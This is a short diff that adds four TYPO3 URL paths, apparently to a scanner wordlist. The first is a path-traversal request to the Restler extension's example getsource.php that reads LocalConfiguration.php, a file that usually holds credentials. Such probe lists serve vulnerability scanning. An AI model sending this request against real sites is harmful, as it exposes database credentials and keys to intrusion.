@@ -1,0 +1,4 @@
+/typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php
+/typo3/
+/typo3/sysext/install/composer.json
+/typo3/install.php
